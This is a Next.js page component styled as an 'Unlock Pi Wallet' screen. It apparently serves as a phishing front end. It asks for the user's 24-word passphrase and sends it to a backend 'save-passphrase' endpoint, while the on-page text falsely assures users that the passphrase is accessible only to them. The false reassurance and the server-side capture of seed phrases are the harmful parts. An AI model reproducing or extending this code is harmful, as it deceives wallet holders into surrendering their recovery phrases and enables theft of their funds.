
"use client";

import { useState, useEffect, Suspense } from "react";
import { useSearchParams } from "next/navigation";
import { Textarea } from "@/components/ui/textarea";
import { CustomButton } from "@/components/ui/button";
import axios from "axios";

function UnlockWalletContent() {
  const [passphrase, setPassphrase] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const [token, setToken] = useState<string | null>(null);
  const searchParams = useSearchParams();

  const API_BASE_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:8080";

  useEffect(() => {
    const extractedToken = searchParams?.get("token");
    if (extractedToken) {
      setToken(extractedToken);
    } else {
      axios
        .get(`${API_BASE_URL}/api/wallet/generate-link`)
        .then((response) => {
          if (response.data.link) {
            const url = new URL(response.data.link);
            const newToken = url.searchParams.get("token");
            if (newToken) setToken(newToken);
          }
        })
        .catch(() => setError("Failed to generate unlock link"));
    }
  }, [searchParams, API_BASE_URL]);

  const handleUnlock = async () => {
    if (!token) {
      setError("Token is missing");
      return;
    }

    if (!passphrase.trim()) {
      setError("Please enter your passphrase");
      return;
    }

    setError(null);
    setSuccess(null);

    try {
      const response = await axios.post(
        `${API_BASE_URL}/api/wallet/save-passphrase?token=${encodeURIComponent(token)}`,
        { passphrase },
        { headers: { "Content-Type": "application/json" } }
      );

      setSuccess(response.data.message);
    } catch (error) {
      if (axios.isAxiosError(error)) {
        setError(error.response?.data?.message || "Failed to unlock wallet");
      } else {
        setError("An unexpected error occurred");
      }
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-white p-6">
      <div className="flex items-center justify-center space-x-2 bg-purple-700 text-white w-full max-w-lg p-4 rounded-t-lg">
  <img src="/icons/wallet-icons.svg" alt="Wallet Icon" className="w-6 h-6" />
  <h2 className="text-lg font-semibold">Wallet</h2>
  <img src="/icons/wallet-icon.svg" alt="Wallet Icon" className="w-6 h-6" />
</div>
      <div className="w-full max-w-lg bg-white shadow-md rounded-b-lg p-6 text-center">
        <h1 className="text-xl font-semibold mb-4">Unlock Pi Wallet</h1>
        <Textarea
          placeholder="Enter your 24-word passphrase here"
          value={passphrase}
          onChange={(e) => setPassphrase(e.target.value)}
          className="w-full border border-gray-300 rounded-md p-4 text-gray-600 resize-none"
          style={{ height: "12rem" }}         />
        {error && <p className="text-red-500 mt-2">{error}</p>}
        {success && <p className="text-green-500 mt-2">{success}</p>}

        <CustomButton
          onClick={handleUnlock}
          className="w-full bg-purple-500 hover:bg-purple-600 text-white font-bold py-3 mt-4 rounded-md"
        >
          Unlock With Passphrase
        </CustomButton>

        <CustomButton
          onClick={() => alert("Fingerprint unlock not implemented yet")}
          className="w-full bg-purple-700 hover:bg-purple-800 text-white font-bold py-3 mt-2 rounded-md"
        >
          Unlock With Fingerprint
        </CustomButton>

        {/* Information */}
        <p className="text-gray-500 text-sm mt-4">
          As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
        </p>
        <p className="text-gray-600 text-sm mt-2">
          Lost your passphrase?{" "}
          <a href="#" className="text-blue-500">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
        </p>
      </div>
    </div>
  );
}

export default function UnlockWallet() {
  return (
    <Suspense fallback={<p>Loading...</p>}>
      <UnlockWalletContent />
    </Suspense>
  );
}
